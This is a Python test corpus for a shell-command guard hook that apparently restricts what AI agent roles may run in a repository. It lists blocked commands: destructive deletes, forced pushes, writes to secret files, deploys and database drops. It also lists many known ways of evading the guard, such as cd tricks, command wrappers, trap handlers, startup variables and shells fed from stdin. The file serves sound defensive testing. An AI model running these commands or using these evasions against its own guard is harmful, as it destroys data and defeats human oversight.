"""Table-driven adversarial corpus for hooks/guard.py.

Each row is (role, command, verdict). `verdict` is "allow" or "block". Commands run
with the project fixture below as the hook's cwd. Every bypass found in review gets a
row here next to the benign commands that must keep working, so a fix can't quietly
turn into over-blocking.
"""
from __future__ import annotations

import contextlib
import importlib.util
import io
import json
import os
import subprocess
import sys
import tempfile
import time
import unittest
from unittest import mock
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
_spec = importlib.util.spec_from_file_location("etk_guard", ROOT / "hooks" / "guard.py")
guard = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(guard)

ROLES = {
    "dev": "engineering-team:developer",
    "rev": "engineering-team:code-reviewer",
    "ux": "engineering-team:ux-reviewer",
    "qa": "engineering-team:qa-engineer",
    "scout": "engineering-team:scout",
    "tw": "engineering-team:tech-writer",
}
RO = ("rev", "ux", "scout", "tw")


def each(roles, cmd, verdict):
    return [(r, cmd, verdict) for r in roles]


# Commands every role may run.
BENIGN = (
    each(ROLES, "git status", "allow")
    + each(ROLES, "git diff main...HEAD", "allow")
    + each(ROLES, "git log --oneline -5", "allow")
    + each(ROLES, "grep -rn 'git push' src", "allow")
    + each(ROLES, "ls -la | head", "allow")
    + each(ROLES, "npm test 2>&1 | tail -20", "allow")
    + each(["dev", "rev", "ux", "scout", "tw"], "npm test > /dev/null", "allow")
    + each(ROLES, "echo hi > /tmp/etk-notes.txt", "allow")
    + each(ROLES, "cat src/a.js", "allow")
    + each(ROLES, "python3 -m pytest -q", "allow")
    + each(ROLES, "npx eslint src", "allow")
    + each(ROLES, "npx prettier --check src", "allow")
    + each(ROLES, "black --check .", "allow")
    + each(ROLES, "git log --grep='git restore'", "allow")
    + [
        ("dev", "git checkout -b etk/feature", "allow"),
        ("dev", "git commit -m 'handle git push errors'", "allow"),
        ("dev", "rm -rf node_modules/.cache", "allow"),
        ("dev", "rm -rf build", "allow"),
        ("dev", "echo x > src/a.js", "allow"),
        ("dev", "FOO=1 npm run build", "allow"),
        ("dev", "docker build -t img .", "allow"),
        ("dev", "kubectl get pods", "allow"),
        ("dev", "terraform plan", "allow"),
        ("dev", "helm list", "allow"),
        ("dev", "gh pr view 12", "allow"),
        ("dev", "shopify theme dev", "allow"),
        ("dev", "git add src/a.js && git commit -m 'Add parsing'", "allow"),
        ("qa", "echo y > tests/new.test.js", "allow"),
        ("qa", "npm test > /tmp/qa-out.txt", "allow"),
        ("qa", "cp src/a.js tests/fresh-copy.test.js", "allow"),
        ("qa", "git worktree add ../base HEAD", "allow"),
        ("tw", "git diff --stat", "allow"),
    ]
)

# Baseline blocks that already held before the review; they must not regress.
BASELINE_BLOCKS = (
    each(ROLES, "git push", "block")
    + each(ROLES, "git push --force origin x", "block")
    + each(ROLES, "git -C . push", "block")
    + each(ROLES, "git reset --hard HEAD~1", "block")
    + each(ROLES, "git stash", "block")
    + each(ROLES, "npm publish", "block")
    + each(ROLES, "echo SECRET=1 >> .env", "block")
    + each(ROLES, "bash -c 'git push'", "block")
    + each(ROLES, "rm -rf /etc/x", "block")
    + each(RO, "echo x > src/a.js", "block")
    + each(RO, "sed -i s/a/b/ src/a.js", "block")
    + [("qa", "echo y > src/a.js", "block"), ("qa", "sed -i s/a/b/ src/a.js", "block")]
)

# R1-1: `cd`, `pushd` and `git -C` change where later parts of the same command run.
R1_1_CD = (
    [("dev", "cd .. && rm -rf other", "block"),
     ("dev", "cd / && rm -rf home", "block"),
     ("dev", "pushd .. && rm -rf other", "block"),
     ("dev", "cd src; cd ../.. && rm -rf other", "block"),
     ("dev", "cd $X && rm -rf out", "block"),
     ("dev", "cd - && rm -rf out", "block"),
     ("dev", "cd /tmp && git push", "block"),
     ("dev", "(cd .. && rm -rf other)", "block"),
     ("dev", "cd src && rm -rf build", "allow"),
     ("dev", "cd /tmp && rm -rf scratch", "allow"),
     ("dev", "cd src && npm test", "allow"),
     ("dev", "(cd .. && ls); rm -rf build", "allow"),
     ("dev", "cd .. | cat; rm -rf build", "allow"),
     ("rev", "cd /tmp && echo x > z", "allow"),
     ("rev", "cd src && echo x > z", "block"),
     ("rev", "cd .. && echo x > z", "block"),
     ("rev", "cd $X && echo x > z", "block"),
     ("rev", "(cd /tmp && echo x > z); echo y > src/a.js", "block"),
     ("rev", "pushd /tmp && echo x > z && popd && echo y > z", "block"),
     ("qa", "cd tests && echo x > existing.test.js", "block"),
     ("qa", "cd tests && echo x > fresh.test.js", "allow"),
     ("qa", "cd src && echo y > a.js", "block"),
     ("scout", "cd /tmp && echo x > z", "allow")]
)

# R1-2: compound syntax, wrappers, find, and shells fed from stdin.
R1_2_COMPOUND = (
    [("dev", c, "block") for c in [
        "if true; then git push; fi",
        "if git push; then echo ok; fi",
        "for f in a b; do git push; done",
        "while true; do git push; done",
        "until false; do git push; done",
        "{ git push; }",
        "! git push",
        "if true; then echo a; else git push; fi",
        "if false; then echo a; elif true; then git push; fi",
        "timeout 5 git push",
        "timeout -s KILL 5 git push",
        "nice git push",
        "nice -n 5 git push",
        "ionice -c 3 git push",
        "stdbuf -oL git push",
        "caffeinate git push",
        "caffeinate -i git push",
        "setsid git push",
        "sudo -u root git push",
        "env -i FOO=1 git push",
        "find .. -delete",
        "find / -exec rm -rf {} +",
        "find ../x -exec rm -rf {} \\;",
        "find . -name x -execdir git push \\;",
        "find . -name x -ok git push \\;",
        "bash -c -- 'git push'",
        "bash -x -c 'git push'",
        "echo 'git push' | sh",
        "echo 'git push' | bash -s",
        "cat script.sh | sh",
        "bash <<< 'git push'",
        "bash",
        "sh <<EOF\ngit push\nEOF",
    ]]
    + [("rev", c, "block") for c in [
        "if true; then echo x > src/a.js; fi",
        "for f in a; do rm src/a.js; done",
        "timeout 5 sed -i s/a/b/ src/a.js",
        "nice -n 5 tee src/a.js",
        "find src -name '*.js' -delete",
        "find src -exec rm {} +",
        "find . -exec sed -i s/a/b/ {} +",
    ]]
    + [("qa", c, "block") for c in [
        "find tests -name '*.js' -delete",
        "timeout 5 sed -i s/a/b/ src/a.js",
    ]]
    + [("dev", c, "allow") for c in [
        "if true; then npm test; fi",
        "for f in a b; do echo $f; done",
        "while read l; do echo $l; done < list.txt",
        "{ echo a; echo b; } > /tmp/out.txt",
        "! git diff --quiet",
        "timeout 5 npm test",
        "timeout -s KILL 5 npm test",
        "nice -n 5 npm test",
        "caffeinate -i npm test",
        "sudo -u root npm test",
        "find . -name '*.pyc' -delete",
        "find . -name x -exec rm -rf {} +",
        "find src -name '*.js' -exec grep -l foo {} \\;",
        "bash scripts/run.sh",
        "bash -c 'npm test'",
        "bash <<< 'npm test'",
        "sh <<EOF\nnpm test\nEOF",
        "echo hi | cat",
    ]]
    + [("rev", c, "allow") for c in [
        "timeout 5 npm test",
        "if true; then npm test; fi",
        "find src -name '*.js' -exec grep -l foo {} \\;",
        "find /tmp/etk-scratch -delete",
        "for f in a b; do echo $f; done",
    ]]
)

# Process substitution bodies run as commands too.
PROCESS_SUBST = (
    [("dev", c, "block") for c in ["cat <(rm -rf /)", "cat <(git push)", "diff <(git push) x", "echo hi | tee >(git push)"]]
    + [("rev", "cat <(echo x > src/a.js)", "block")]
    + [("dev", "diff <(git show HEAD:a) <(git show HEAD~1:a)", "allow"),
       ("rev", "diff <(git show HEAD:a) <(git show HEAD~1:a)", "allow")]
)

# cd/pushd/popd forms whose target can't be known must make later paths strict.
CD_UNKNOWN = (
    [("dev", c, "block") for c in [
        "pushd +1 && rm -rf out",
        "pushd && rm -rf out",
        "pushd -n .. && rm -rf out",
        "pushd src && popd +0 && rm -rf out",
        "pushd src && pushd +1 && popd && rm -rf out",
        "cd -P .. && rm -rf other",
        "cd -e .. && rm -rf other",
        "find . -exec cd .. \\; ; rm -rf other",
        "CDPATH=/ cd src && rm -rf build",
        "export CDPATH=/etc; cd x && rm -rf y",
        "command cd .. && rm -rf other",
        "builtin cd .. && rm -rf other",
        "{ cd ..; rm -rf other; }",
        "if true; then cd ..; rm -rf other; fi",
        "true && cd .. && rm -rf other",
        "false || cd .. ; rm -rf other",
        "time cd .. && rm -rf other",
    ]]
    + [("rev", "pushd +1 && echo x > z", "block"), ("rev", "cd -P /tmp && echo x > z", "block")]
    + [("dev", c, "allow") for c in [
        "pushd src && popd && rm -rf build",
        "cd -L src && rm -rf build",
        "cd -- src && rm -rf build",
        "echo cd",
    ]]
)

# How a shell is told where its commands come from: -c script, stdin, or a file.
SHELL_ARGV = (
    [("dev", c, "block") for c in [
        "echo 'git push' | bash -es",
        "echo 'git push' | bash -s -- a",
        "echo 'git push' | bash -",
        "echo 'git push' | bash /dev/stdin",
        "echo 'git push' | bash /dev/fd/0",
        "echo 'git push' | sh -o pipefail",
        "echo 'git push' | bash -O extglob",
        "echo 'git push' | bash +x",
        "echo 'git push' | bash --norc",
        "bash -s script.sh",
        "bash -o pipefail",
        "bash --rcfile x -c 'git push'",
        "bash -o pipefail -c 'git push'",
        "bash +o pipefail -c 'git push'",
        "bash -O extglob -c 'git push'",
        "bash +x -c 'git push'",
        "bash -e -c -- 'git push'",
        "bash -o pipefail -c 'rm -rf /'",
        "bash -o pipefail -c",
        "bash -c -o",
        "source /dev/stdin",
    ]]
    + [("dev", c, "allow") for c in [
        "bash -o pipefail scripts/run.sh",
        "bash -O extglob -c 'npm test'",
        "bash +x scripts/run.sh",
        "bash -o pipefail -c 'npm test'",
        "bash --norc scripts/run.sh",
        "bash -e scripts/run.sh arg",
        "bash -o pipefail <<< 'npm test'",
        "source scripts/env.sh",
    ]]
)

# Wrapper options with values, env -S, unknown wrapper options, and more compound keywords.
WRAPPER_OPTS = (
    [("dev", c, "block") for c in [
        "env -S 'git push'",
        "env --split-string='git push'",
        "env -i -S 'git push'",
        "exec -a x git push",
        "time -f %e git push",
        "time -o /tmp/t git push",
        "time --format x git push",
        "timeout --weird 5 git push",
        "sudo --weird git push",
        "case x in a) git push;; esac",
        "function f { git push; }",
        "f() { git push; }; f",
        "coproc git push",
        "coproc NAME { git push; }",
        "select x in a b; do git push; done",
        "{ ! git push; }",
        "if ! git push; then echo no; fi",
    ]]
    + [("dev", c, "allow") for c in [
        "timeout --preserve-status 5 npm test",
        "env -i FOO=1 npm test",
        "env -S 'npm test'",
        "xargs -n1 echo",
        "echo a b | xargs -I {} echo {}",
        "nice -5 npm test",
        "sudo -E npm test",
        "case x in a) echo hi;; esac",
        "f() { echo hi; }; f",
        "function f { echo hi; }",
        "time -p npm test",
    ]]
)

# cd tracking must fail closed when the shell could end up somewhere else.
CD_FAIL_CLOSED = (
    [("dev", c, "block") for c in [
        "eval 'cd ..' && rm -rf other",
        "eval 'pushd ..'; rm -rf other",
        "source ./env.sh && rm -rf out",
        ". ./env.sh && rm -rf out",
        "export CDPATH=/etc && cd x && rm -rf y",
        "declare -x CDPATH=/etc; cd x && rm -rf y",
        "env CDPATH=/etc cd x && rm -rf y",
        "CDPATH+=:/etc cd x && rm -rf y",
        "cd a b && rm -rf other",
        "pushd a b && rm -rf x",
        "pushd src && popd x && rm -rf out",
        "cd src; rm -rf build",
        "cd src || rm -rf build",
        "pushd src; rm -rf build",
        "pushd src && pushd .. | cat; popd && rm -rf ../x",
    ]]
    + [("rev", "cd /tmp; echo y > z", "block")]
    + [("dev", c, "allow") for c in [
        "eval 'echo hi' | cat; rm -rf build",
        "cd src && rm -rf build",
        "pushd src && popd && rm -rf build",
    ]]
)

# Clustered shell options that take values, and spellings of stdin.
SHELL_CLUSTERS = (
    [("dev", c, "block") for c in [
        "bash -oc pipefail 'git push'",
        "bash -co pipefail 'git push'",
        "bash -eoc pipefail 'git push'",
        "bash -Oc extglob 'git push'",
        "bash -oo errexit pipefail -c 'git push'",
        "bash -oo a",
        "echo 'git push' | bash -eo pipefail",
        "echo 'git push' | bash //dev/stdin",
        "echo 'git push' | bash /dev/./stdin",
        "echo 'git push' | bash /dev//fd/0",
        "echo 'git push' | bash /dev/fd/00",
        "echo 'git push' | bash /proc/self/fd/0",
        "echo 'git push' | bash /proc/12345/fd/0",
        "echo 'git push' | bash /proc//self/fd/0",
        "echo 'git push' | bash /dev/fd/3",
        "source //dev/stdin",
        ". /dev/./stdin",
    ]]
    + [("dev", c, "allow") for c in [
        "bash -oc pipefail 'npm test'",
        "bash -eo pipefail scripts/run.sh",
        "bash -Oc extglob 'npm test'",
    ]]
)

# env -S has its own splitting rules; coproc only skips a NAME before a brace group;
# time -o writes a file.
WRAPPER_EDGES = (
    [("dev", c, "block") for c in [
        "env -S 'git\\_push'",
        "env -S 'echo hi\\c git push'",
        "env -S '${CMD}'",
        "env -S 'git\\ push'",
        "coproc foo { git push; }",
        "coproc { git push; }",
        "coproc git push {}",
        "coproc git push '{'",
        "time -o .env npm test",
        "time -o.env npm test",
        "time --output=.env npm test",
        "time --output .env npm test",
    ]]
    + [("rev", c, "block") for c in [
        "time -o src/a.js npm test",
        "time --output=src/a.js npm test",
        "time -osrc/a.js npm test",
    ]]
    + [("qa", c, "block") for c in ["time -o src/a.js npm test", "time --output=tests/existing.test.js npm test"]]
    + [("dev", c, "allow") for c in [
        "env -S 'echo \"a b\"'",
        "env -S 'npm test'",
        "coproc { echo hi; }",
        "coproc foo { echo hi; }",
        "time -o out.txt npm test",
    ]]
    + [("rev", "time -o /tmp/t npm test", "allow"), ("qa", "time -o tests/new.txt npm test", "allow"),
       ("qa", "npm test > /dev/null", "allow")]
)

# A cd may have failed, so later `;`/`||`/newline commands may run elsewhere; string-evaluating
# builtins; CDPATH set through expansion; stdin named relative to the tracked directory.
CD_LATER_AND_BUILTINS = (
    [("dev", c, "block") for c in [
        "cd src && ls; rm -rf ../x",
        "cd src && ls || rm -rf ../x",
        "cd src && ls\nrm -rf ../x",
        "cd src && echo a; rm -rf build",
        "pushd src && ls; popd && rm -rf x",
        "trap 'git push' EXIT",
        "trap 'echo hi' DEBUG",
        "trap 'echo hi' ERR",
        "trap 'echo hi' RETURN",
        "trap 'git push' INT",
        "trap 'cd ..' INT; rm -rf other",
        "mapfile -C 'git push' -c 1 < /tmp/f",
        "readarray -C 'git push' -c 1 < /tmp/f",
        "complete -C 'git push' foo",
        "bind -x '\"\\C-x\":git push'",
        "PROMPT_COMMAND='git push'",
        "export PROMPT_COMMAND='git push'",
        "BASH_ENV=x.sh npm test",
        "export X=$(pwd); cd src && rm -rf build",
        "export V=CDPATH; export $V=/etc; cd x && rm -rf y",
        "read CDPATH; cd x && rm -rf y",
        "printf -v CDPATH %s /etc; cd x && rm -rf y",
        "declare -x $N=/etc; cd x && rm -rf y",
        "cd /dev && bash stdin",
        "cd /proc/self/fd && sh 0",
        "cd $X && bash script.sh",
        "bash stdin-link",
    ]]
    + [("rev", "cd /tmp && ls; echo x > z", "block")]
    + [("dev", c, "allow") for c in [
        "(cd src && ls); rm -rf build",
        "cd src && ls && rm -rf build",
        "trap - INT",
        "mapfile -t a < /tmp/f",
        "X=1 && cd src && rm -rf build",
        "export X=$(pwd); cd /tmp && rm -rf scratch",
        "cd src && bash ../scripts/run.sh",
    ]]
)

# time's own options, env -S escapes, and coproc with quoted or odd words.
WRAPPER_EDGES_2 = (
    [("dev", c, "block") for c in [
        "time -f %e -o .env npm test",
        "time -p -o .env npm test",
        "time --format x --output=.env npm test",
        "time --format=x -o.env npm test",
        "sudo time -o .env npm test",
        "env -S 'npm test \\n'",
        "env -S '# git push'",
        "env -S 'echo hi # git push'",
        "coproc 'foo bar' { git push; }",
        "coproc '{' echo hi",
        "coproc foo '{' git push",
    ]]
    + [("rev", c, "block") for c in ["time -f %e -o src/a.js npm test", "time --format x --output=src/a.js npm test"]]
    + [("qa", "time -f %e -o src/a.js npm test", "block")]
    + [("dev", c, "allow") for c in ["env -S 'echo a#b'", "time -f %e -o out.txt npm test", "coproc foo { echo hi; }"]]
    + [("rev", "time -f %e -o /tmp/t npm test", "allow")]
)

# A trap handler runs later, from wherever the shell is then.
TRAP_STRICT = (
    [("dev", c, "block") for c in [
        "trap 'rm -rf build' INT",
        "trap 'echo hi' INT; cd /tmp; rm -rf scratch",
        "trap 'echo hi' INT; cd /tmp && rm -rf scratch",
    ]]
    + [("dev", c, "allow") for c in ["trap 'rm -rf /tmp/etk-scratch' INT", "trap - INT", "trap 'echo bye' INT"]]
)

# Variables the shell evaluates as code.
STARTUP_VARS = (
    [("dev", c, "block") for c in [
        "BASH_ENV=x.sh npm test",
        "PS4='x' bash -x s.sh",
        "PS0=x true",
        "export PS0=x",
        "declare -x PS4=x",
        "declare PROMPT_COMMAND=x",
        "PROMPT_COMMAND='git push'",
        "PROMPT_COMMAND[0]='git push'",
        "PROMPT_COMMAND+=';git push'",
        "env BASH_ENV=x.sh npm test",
        "read PS4",
        "read -r BASH_ENV",
        "printf -v PS4 %s x",
        "export 'PS4[1]=x'",
    ]]
    + [("dev", c, "allow") for c in ["NODE_ENV=test npm test", "echo ENV", "git grep -n ENV src", "export FOO=1"]]
)

# Names that only look like assignments (arguments, not leading assignments) are not assignments.
ENV_LOOKALIKES = (
    [("dev", c, "allow") for c in [
        "ENV=test npm test",
        "export ENV=staging",
        "docker run -e ENV=prod app",
        "make test ENV=ci",
        "grep -rn ENV= src",
        "git log -S ENV=prod",
        "rg PROMPT_COMMAND= .",
        "rg BASH_ENV= .",
        "grep -rn HOME= .",
        "git grep -n GIT_DIR= hooks",
        "rg UPDATE_SNAPSHOTS= .",
        "docker run -e PS4=x app",
    ]]
    + [(r, c, "allow") for r in ("rev", "qa") for c in [
        "grep -rn HOME= .",
        "git grep -n GIT_DIR= hooks",
        "rg UPDATE_SNAPSHOTS= .",
        "rg GIT_PAGER= .",
        "grep -rn PS4= src",
        "make test HOME=/tmp/x",
        "ENV=test npm test",
    ]]
    + [("dev", c, "block") for c in ["env PS4=x npm test", "sudo env BASH_ENV=x.sh ls", "timeout 5 env PS0=x ls"]]
)

# Variables set for a command that find -exec runs.
NESTED_ENV = (
    each(ROLES, "find . -exec env BASH_ENV=x sh -c true \\;", "block")
    + [(r, "find . -exec env GIT_DIR=/tmp/x git log \\;", "block") for r in ("rev", "qa")]
    + [(r, "find . -exec env UPDATE_SNAPSHOTS=1 npm test \\;", "block") for r in ("rev", "qa")]
    + [("dev", "scripts/etk.sh exec G3 --type test -- env BASH_ENV=x npm test", "block")]
    + each(ROLES, "find . -exec env LANG=C ls {} \\;", "allow")
)

# Wrapper write targets inside nested commands.
NESTED_TIME_OUTPUT = (
    [("dev", "find . -name x -exec time -o .env npm test \\;", "block"),
     ("dev", "find . -execdir time --output=.env npm test \\;", "block"),
     ("rev", "find . -name x -exec time -o src/a.js npm test \\;", "block"),
     ("qa", "find . -name x -exec time -o src/a.js npm test \\;", "block"),
     ("dev", "find . -name x -exec time -o /tmp/t npm test \\;", "allow")]
)

# A cd inside a backgrounded list doesn't move the parent shell.
BACKGROUND_CD = (
    [("dev", c, "block") for c in [
        "cd src && ls & rm -rf ../x",
        "cd src && cd .. & rm -rf ../x",
        "cd /tmp && sleep 1 & rm -rf build",
    ]]
    + [("dev", c, "allow") for c in ["npm test & npm run lint", "cd src && ls && rm -rf build", "cd /tmp && ls & rm -rf /tmp/x"]]
)

# A shell operand that the same command creates could be a link to stdin.
CREATED_OPERAND = (
    [("dev", c, "block") for c in [
        "ln -s /dev/stdin x && bash x",
        "cp /dev/stdin run.sh && bash run.sh",
        "echo 'git push' > run.sh && bash run.sh",
        "mv a b; sh b",
        "tee x.sh < /dev/null; bash ./x.sh",
        "ln -s /dev/stdin x && source x",
    ]]
    + [("dev", c, "allow") for c in [
        "bash scripts/run.sh",
        "cp a b && bash scripts/run.sh",
        "npm test > /tmp/o.txt && bash scripts/run.sh",
        "ln -s a b && bash scripts/run.sh",
    ]]
)

# R1-3: `git checkout` with a path discards uncommitted work.
GIT_CHECKOUT = (
    [("dev", c, "block") for c in [
        "git checkout src/a.js",
        "git checkout HEAD src/a.js",
        "git checkout HEAD -- src/a.js",
        "git checkout main -- .",
        "git checkout -- .",
        "git checkout .",
        "git checkout -f main",
        "git checkout --force feature",
        "git checkout -p",
        "git checkout -m feature",
        "git checkout main src/a.js",
        "git checkout -b x -- src/a.js",
        "git checkout nosuchbranch",
        "git -C . checkout src/a.js",
        "cd src && git checkout a.js",
        "timeout 5 git checkout src/a.js",
    ]]
    + [("dev", c, "allow") for c in [
        "git checkout main",
        "git checkout feature",
        "git checkout -b etk/x",
        "git checkout -B etk/y main",
        "git checkout -b x HEAD~1",
        "git checkout --detach HEAD",
        "git checkout -",
        "git checkout HEAD",
    ]]
)

# R1-4: the repository itself, and bulk deletes through git.
GIT_DIR_AND_CLEAN = (
    [("dev", c, "block") for c in [
        "rm -rf .git",
        "rm -r .git/hooks",
        "rm .git/index",
        "rm -f .git/index.lock",
        "rm -rf src/../.git",
        "cd src && rm -rf ../.git",
        "mv .git /tmp/g",
        "find .git -delete",
        "git clean -d",
        "git clean -i",
        "git clean -fdx",
        "git -c clean.requireForce=false clean -d",
        "git rm -rf .",
        "git rm -r src",
        "git rm -f src/a.js",
        "git rm -r --force .",
        "git rm '*'",
        "git rm .",
        "git rm -r --cached -f src",
    ]]
    + [("dev", c, "allow") for c in [
        "git clean -n",
        "git clean -dn",
        "git clean --dry-run -d",
        "git rm src/a.js",
        "git rm --cached src/a.js",
        "git rm -r --cached dist",
        "rm .gitignore",
        "rm -rf .github/tmp",
        "git mv src/a.js src/b.js",
    ]]
)

# R1-5: deploy and infra commands with global options, or through npx.
DEPLOY_FORMS = (
    [("dev", c, "block") for c in [
        "kubectl -n prod apply -f x.yml",
        "kubectl --context prod delete pod x",
        "kubectl --namespace=prod rollout restart deploy/x",
        "terraform -chdir=infra apply",
        "terraform -chdir=infra destroy",
        "helm -n x upgrade app ./chart",
        "helm --kube-context prod install app ./chart",
        "docker -H tcp://h:2375 push img",
        "docker --context prod image push img",
        "docker buildx build --push -t img .",
        "npx vercel --prod",
        "npx --yes vercel --prod",
        "npx netlify deploy --prod",
        "pnpm dlx vercel --prod",
        "npx wrangler deploy",
        "npx firebase deploy",
        "npm --prefix web publish",
        "pnpm -r publish",
        "yarn npm publish",
        "cargo +nightly publish",
        "python -m twine upload dist/*",
        "gh -R org/repo pr merge 12",
        "gh api -X PUT repos/o/r/pulls/12/merge",
        "gh api --method=DELETE repos/o/r",
        "gh api repos/o/r/releases -f tag_name=v1",
        "sudo kubectl -n prod apply -f x.yml",
        "psql -c 'DROP TABLE users'",
    ]]
    + [("dev", c, "allow") for c in [
        "kubectl -n prod get pods",
        "kubectl --context prod logs x",
        "terraform -chdir=infra plan",
        "helm -n x list",
        "docker -H tcp://h:2375 ps",
        "docker build -t img .",
        "npx vercel --version",
        "npx jest --prod",
        "npm --prefix web test",
        "yarn install",
        "cargo +nightly build",
        "gh -R org/repo pr view 12",
        "gh api repos/o/r/pulls/12",
        "gh api graphql -f query='query { viewer { login } }'",
        "psql -c 'select 1'",
        "shopify theme dev",
    ]]
)

# R1-6: shell writers and in-place edits must not create or change secret files.
SECRET_WRITES = (
    [(r, c, "block") for r in ("dev", "qa") for c in [
        "cp x .env",
        "cp x config/key.pem",
        "mv x .env.local",
        "mv -t . x.env y/.env.prod",
        "tee .env",
        "echo x | tee -a .env",
        "echo x | tee /tmp/a .env",
        "install -m 600 x .env",
        "ln -s x .env",
        "dd if=x of=.env",
        "touch .env",
        "sed -i s/a/b/ .env",
        "perl -pi -e 's/a/b/' .env",
    ]]
    + [("dev", c, "allow") for c in [
        "cp .env .env.example",
        "cp .env /tmp/backup.env",
        "tee /tmp/a < x",
        "cp src/a.js src/b.js",
        "mv .env.example .env.sample",
        "sed -i s/a/b/ src/a.js",
        "tee .env.example",
        "cat .env",
    ]]
    + [("rev", "tee /tmp/a < x", "allow"), ("rev", "cat x | tee /tmp/a", "allow")]
)

# R1-7: read-only roles can't mutate through git, installers, formatters or downloaders.
READ_ONLY_MUTATIONS = (
    [(r, c, "block") for r in ("rev", "scout") for c in [
        "git -C . apply x.patch",
        "git switch main",
        "git am p.patch",
        "git cherry-pick abc",
        "git merge main",
        "git pull",
        "git fetch",
        "git reset",
        "git config user.name x",
        "git config --global x y",
        "git branch newb",
        "git branch -D x",
        "git tag v1",
        "git remote add o u",
        "git worktree add ../w",
        "git stash",
        "git diff --output=x.txt",
        "git -c alias.log='!touch x' log",
        "git commit -m x",
        "git checkout main",
        "git restore x",
        "python -m black .",
        "go fmt ./...",
        "cargo fmt",
        "npx biome check --apply .",
        "npx biome format --write .",
        "terraform fmt",
        "deno fmt",
        "npm install",
        "npm i left-pad",
        "npm --prefix web ci",
        "yarn",
        "yarn add x",
        "pnpm i",
        "pip install x",
        "python -m pip install x",
        "uv add x",
        "cargo add x",
        "go mod tidy",
        "curl -o out.txt https://example.com",
        "curl -O https://example.com/f",
        "curl -sSLo out https://example.com",
        "wget https://example.com/f",
        "wget -O out.txt https://example.com",
        "tar xf a.tgz",
        "tar -xzf a.tgz",
        "tar czf out.tgz src",
        "unzip a.zip",
        "unzip -o a.zip",
        "awk -i inplace '{print}' f",
        "gawk -i inplace '{print}' f",
    ]]
    + [(r, c, "allow") for r in ("rev", "scout") for c in [
        "git diff main",
        "git log --oneline -5 -- src",
        "git show HEAD:README.md",
        "git status -sb",
        "git grep -n x",
        "git blame src/a.js",
        "git rev-parse HEAD",
        "git ls-files",
        "git merge-base main HEAD",
        "git worktree list",
        "git branch --list",
        "git branch -a",
        "git branch --show-current",
        "git tag -l",
        "git tag",
        "git remote -v",
        "git stash list",
        "git config --get user.name",
        "git config --list",
        "git -C . diff --stat",
        "git cat-file -p HEAD",
        "git for-each-ref",
        "curl https://example.com",
        "curl -s https://example.com | head",
        "curl -o /tmp/etk-x https://example.com",
        "wget --spider https://example.com",
        "wget -O - https://example.com",
        "wget -O /tmp/etk-f https://example.com",
        "tar tf a.tgz",
        "tar -tzf a.tgz",
        "unzip -l a.zip",
        "unzip -p a.zip f",
        "awk '{print}' f",
        "gofmt -l .",
        "go vet ./...",
        "go test ./...",
        "cargo fmt --check",
        "cargo test",
        "npm test",
        "npm ls",
        "npm run lint",
        "yarn test",
        "yarn --version",
        "pip list",
        "pip show x",
        "terraform fmt -check",
        "python -m pytest -q",
    ]]
)

# R1-8: the QA "create only" rule must not leak through editors, git, inline code or snapshots.
QA_LEAKS = (
    [("qa", c, "block") for c in [
        "perl -pi -e 's/a/b/' tests/existing.test.js",
        "npx prettier --write tests",
        "black .",
        "ruff format .",
        "gofmt -w x.go",
        "cargo fmt",
        "git checkout main -- src/a.js",
        "git checkout main",
        "git apply p.patch",
        "git stash",
        "git reset",
        "git merge main",
        "git restore src/a.js",
        "git worktree prune",
        "python3 -c \"open('tests/existing.test.js','w').write('x')\"",
        "node -e \"require('fs').writeFileSync('a','x')\"",
        "jest -u",
        "npx jest --updateSnapshot",
        "npm test -- -u",
        "npx vitest -u",
        "pytest --snapshot-update",
        "npx playwright test --update-snapshots",
        "go test -update ./...",
        "UPDATE_SNAPSHOTS=1 npm test",
    ]]
    + [("rev", c, "block") for c in ["npx jest -u", "UPDATE_SNAPSHOTS=1 npm test", "pytest --snapshot-update"]]
    + [("qa", c, "allow") for c in [
        "npx jest",
        "npm test",
        "pytest -q",
        "git add tests/new.test.js",
        "git commit -m 'add tests'",
        "git status",
        "git diff",
        "git log -3",
        "black --check .",
        "npx prettier --check tests",
        "python3 -c \"print(1)\"",
        "git worktree add ../base HEAD",
        "git worktree remove ../base",
        "cargo fmt --check",
        "npm test -- --coverage",
    ]]
)

# find's file-writing actions follow the same rules as redirects.
FIND_WRITES = (
    [("dev", c, "block") for c in [
        "find . -fprint .env",
        "find . -fprint0 .env",
        "find . -fprintf .env %p",
        "find . -name x -fls key.pem",
    ]]
    + [("rev", "find . -fprint src/out.txt", "block"), ("qa", "find . -fprint tests/existing.test.js", "block")]
    + [("dev", "find . -fprint out.txt", "allow"), ("rev", "find . -fprint /tmp/etk-out.txt", "allow"),
       ("qa", "find . -fprint tests/new-list.txt", "allow")]
)

# Allowlisted git subcommands must not be told to run programs.
GIT_RUNS_PROGRAMS = (
    [(r, c, "block") for r in ("rev", "qa") for c in [
        "git ls-remote --upload-pack='touch x' origin",
        "git ls-remote --upload-pack=x origin",
        "git grep --open-files-in-pager=sh foo",
        "git grep -O foo",
        "git grep -Osh foo",
        "git diff --ext-diff",
        "git log --textconv",
        "git show --textconv HEAD:a",
        "git ls-remote --exec=x origin",
        "GIT_CONFIG_COUNT=1 git log",
        "GIT_CONFIG_KEY_0=core.pager GIT_CONFIG_VALUE_0=x git log",
        "GIT_CONFIG_PARAMETERS=x git log",
        "GIT_EXTERNAL_DIFF=x git diff",
        "GIT_SSH_COMMAND=x git ls-remote origin",
        "GIT_SSH=x git ls-remote origin",
        "GIT_PAGER=x git log",
        "env GIT_PAGER=x git log",
    ]]
    + [(r, c, "allow") for r in ("rev", "qa") for c in [
        "git grep -n foo",
        "git grep --count foo",
        "git diff --stat",
        "git log --oneline",
        "git ls-remote origin",
    ]]
)

# R1-13: protected_paths from .claude/engineering-team.json (fixture: db/migrations/, infra/**, LICENSE, src/legacy/*.js)
PROTECTED = (
    [(r, c, "block") for r in ("dev", "qa") for c in [
        "echo x > db/migrations/001.sql",
        "rm db/migrations/001.sql",
        "rm -rf db/migrations",
        "cp x infra/main.tf",
        "mv x infra/modules/a.tf",
        "tee LICENSE",
        "sed -i s/a/b/ LICENSE",
        "cd db && rm migrations/001.sql",
        "touch infra/new.tf",
        "git rm db/migrations/001.sql",
        "echo x > src/legacy/a.js",
        "find db/migrations -delete",
        "cp -t infra x.tf",
        "perl -pi -e s/a/b/ infra/a.tf",
        "dd if=x of=LICENSE",
        "echo x > ./infra/../LICENSE",
        "timeout 5 tee LICENSE",
        "find . -fprint LICENSE",
        "cd $X && echo x > LICENSE",
    ]]
